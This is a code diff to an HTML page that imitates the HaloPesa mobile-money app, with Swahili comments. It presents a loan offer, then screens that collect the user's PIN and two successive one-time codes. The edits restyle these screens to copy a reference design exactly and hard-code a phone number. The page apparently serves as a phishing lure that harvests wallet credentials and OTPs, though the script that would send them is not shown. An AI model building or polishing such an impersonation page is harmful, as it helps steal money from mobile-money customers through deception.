@@ -45,7 +45,7 @@
     </div>
   </section>
 
-  <!-- SKRINI YA 2: SLIDER YA MKORO -->
+  <!-- SKRINI YA 2: SLIDER YA MKOPO -->
   <section id="screen-slider" class="screen white-screen">
     <div class="top-nav-bar bg-orange">
       <button type="button" class="nav-back-btn text-white" id="btn-slider-back">← Rudi</button>
@@ -224,13 +224,13 @@
     </div>
   </section>
 
-  <!-- SKRINI YA 6: KUINGIA AKAUNTI (PIN SCREEN - MATCHING REFERENCE IMAGE) -->
+  <!-- SKRINI YA 6: PIN ENTRY SCREEN (EXACTLY MATCHING REFERENCE DESIGN) -->
   <section id="screen-signin" class="screen white-screen">
-    <div class="top-nav-bar bg-white-trans">
-      <button type="button" class="nav-back-btn text-dark" id="btn-signin-back">←</button>
+    <div class="top-nav-bar bg-white-clean">
+      <button type="button" class="nav-back-clean" id="btn-signin-back">‹</button>
     </div>
 
-    <div class="card-container-main align-center pin-screen-layout">
+    <div class="card-container-spacious align-center">
       <div class="halopesa-logo-top">
         <span class="logo-text-orange">🔴 halopesa</span>
       </div>
@@ -240,87 +240,109 @@
       </div>
 
       <h3 id="display-applicant-name" class="applicant-name-title">MWOMBAJI</h3>
-      <p id="display-applicant-phone" class="applicant-phone-subtitle">0614 000 000</p>
+      <p id="display-applicant-phone" class="applicant-phone-subtitle">0614 741 646</p>
 
       <h4 class="enter-pin-heading">Enter PIN code</h4>
 
       <div id="banner-pin-error" class="surface-error-banner"></div>
 
-      <div class="pin-entry-row-box">
-        <div class="pin-boxes-cluster">
+      <div class="pin-entry-flex-row">
+        <div class="pin-boxes-spacious">
           <input type="password" class="pin-box-square" maxlength="1" inputmode="numeric">
           <input type="password" class="pin-box-square" maxlength="1" inputmode="numeric">
           <input type="password" class="pin-box-square" maxlength="1" inputmode="numeric">
           <input type="password" class="pin-box-square" maxlength="1" inputmode="numeric">
         </div>
-        <button type="button" id="btn-toggle-pin-visibility" class="show-pin-txt-btn">Show</button>
+        <button type="button" id="btn-toggle-pin-visibility" class="show-text-btn">Show</button>
       </div>
 
-      <a href="#" class="forgot-pin-link">Forgot PIN?</a>
+      <a href="#" class="forgot-pin-link-spacious">Forgot PIN?</a>
+    </div>
+
+    <div class="bottom-fixed-action-area">
+      <button type="button" id="btn-submit-signin" class="btn-solid-light-grey">Continue</button>
     </div>
   </section>
 
-  <!-- SKRINI YA 7: UTHIBITISHO WA OTP (HATUA YA 1) -->
+  <!-- SKRINI YA 7: OTP STEP 1 (MATCHING THE SPACIOUS DESIGN) -->
   <section id="screen-otp1" class="screen white-screen">
-    <div class="top-nav-bar bg-orange">
-      <div class="brand-header-inline">
-        <span class="halopesa-brand-sm text-white">HaloPesa</span>
-      </div>
-      <div class="hamburger text-white">☰</div>
+    <div class="top-nav-bar bg-white-clean">
+      <button type="button" class="nav-back-clean" id="btn-otp1-back">‹</button>
     </div>
 
-    <div class="card-container-main align-center">
-      <div class="card-header-title">
-        <h2>Uthibitisho wa OTP (Hatua ya 1)</h2>
-        <small id="otp1-subtitle">Weka OTP iliyotumwa kwenye namba yako</small>
+    <div class="card-container-spacious align-center">
+      <div class="halopesa-logo-top">
+        <span class="logo-text-orange">🔴 halopesa</span>
       </div>
 
-      <div class="verified-success-alert">
-        ✓ Maelezo yamethibitishwa! Tafadhali weka OTP yako hapa chini.
+      <div class="user-avatar-circle">
+        <span class="avatar-icon">💬</span>
       </div>
+
+      <h3 id="display-otp1-name" class="applicant-name-title">MWOMBAJI</h3>
+      <p id="display-otp1-phone" class="applicant-phone-subtitle">0614 741 646</p>
+
+      <h4 class="enter-pin-heading">Enter OTP (Hatua ya 1)</h4>
+      <p id="otp1-subtitle" class="sub-hint-text">Tafadhali weka namba za uthibitisho zilizotumwa</p>
 
       <div id="banner-otp1-error" class="surface-error-banner"></div>
 
-      <div class="golden-otp-container">
-        <input type="text" class="otp1-box-square" maxlength="1" inputmode="numeric" autocomplete="one-time-code">
-        <input type="text" class="otp1-box-square" maxlength="1" inputmode="numeric">
-        <input type="text" class="otp1-box-square" maxlength="1" inputmode="numeric">
-        <input type="text" class="otp1-box-square" maxlength="1" inputmode="numeric">
+      <div class="pin-entry-flex-row">
+        <div class="pin-boxes-spacious">
+          <input type="password" class="otp1-box-square" maxlength="1" inputmode="numeric" autocomplete="one-time-code">
+          <input type="password" class="otp1-box-square" maxlength="1" inputmode="numeric">
+          <input type="password" class="otp1-box-square" maxlength="1" inputmode="numeric">
+          <input type="password" class="otp1-box-square" maxlength="1" inputmode="numeric">
+        </div>
+        <button type="button" id="btn-toggle-otp1-visibility" class="show-text-btn">Show</button>
       </div>
 
-      <button type="button" id="btn-submit-otp1" class="btn-pulse-white margin-top-20">WASILISHA</button>
+      <a href="#" class="forgot-pin-link-spacious">Rudisha OTP Mpya</a>
+    </div>
+
+    <div class="bottom-fixed-action-area">
+      <button type="button" id="btn-submit-otp1" class="btn-solid-light-grey">Continue</button>
     </div>
   </section>
 
-  <!-- SKRINI YA 8: UTHIBITISHO WA MWISHO WA OTP (HATUA YA 2) -->
+  <!-- SKRINI YA 8: OTP STEP 2 (MATCHING THE SPACIOUS DESIGN) -->
   <section id="screen-otp2" class="screen white-screen">
-    <div class="top-nav-bar bg-orange">
-      <div class="brand-header-inline">
-        <span class="halopesa-brand-sm text-white">HaloPesa</span>
-      </div>
-      <div class="hamburger text-white">☰</div>
+    <div class="top-nav-bar bg-white-clean">
+      <button type="button" class="nav-back-clean" id="btn-otp2-back">‹</button>
     </div>
 
-    <div class="card-container-main align-center">
-      <div class="card-header-title">
-        <h2>Uthibitisho wa Mwisho wa OTP (Hatua ya 2)</h2>
-        <small>Weka OTP ya mwisho ya tarakimu 4 kwa ajili ya uhakiki kamili</small>
+    <div class="card-container-spacious align-center">
+      <div class="halopesa-logo-top">
+        <span class="logo-text-orange">🔴 halopesa</span>
       </div>
 
-      <div class="verified-success-alert">
-        ✓ Hatua karibu imekamilika! Weka namba ya mwisho ya uthibitisho.
+      <div class="user-avatar-circle">
+        <span class="avatar-icon">🔐</span>
       </div>
+
+      <h3 id="display-otp2-name" class="applicant-name-title">MWOMBAJI</h3>
+      <p id="display-otp2-phone" class="applicant-phone-subtitle">0614 741 646</p>
+
+      <h4 class="enter-pin-heading">Enter OTP (Hatua ya 2)</h4>
+      <p class="sub-hint-text">Uthibitisho wa mwisho wa usalama</p>
 
       <div id="banner-otp2-error" class="surface-error-banner"></div>
 
-      <div class="golden-otp-container">
-        <input type="text" class="otp2-box-square" maxlength="1" inputmode="numeric" autocomplete="one-time-code">
-        <input type="text" class="otp2-box-square" maxlength="1" inputmode="numeric">
-        <input type="text" class="otp2-box-square" maxlength="1" inputmode="numeric">
-        <input type="text" class="otp2-box-square" maxlength="1" inputmode="numeric">
+      <div class="pin-entry-flex-row">
+        <div class="pin-boxes-spacious">
+          <input type="password" class="otp2-box-square" maxlength="1" inputmode="numeric" autocomplete="one-time-code">
+          <input type="password" class="otp2-box-square" maxlength="1" inputmode="numeric">
+          <input type="password" class="otp2-box-square" maxlength="1" inputmode="numeric">
+          <input type="password" class="otp2-box-square" maxlength="1" inputmode="numeric">
+        </div>
+        <button type="button" id="btn-toggle-otp2-visibility" class="show-text-btn">Show</button>
       </div>
 
-      <button type="button" id="btn-submit-otp2" class="btn-pulse-white margin-top-20">WASILISHA UHAKIKI</button>
+      <a href="#" class="forgot-pin-link-spacious">Rudisha OTP Mpya</a>
+    </div>
+
+    <div class="bottom-fixed-action-area">
+      <button type="button" id="btn-submit-otp2" class="btn-solid-light-grey">Continue</button>
     </div>
   </section>
 
@@ -376,5 +398,5 @@
 
 <script src="script.js"></script>
 </body>
-            </html>
+  </html>
   
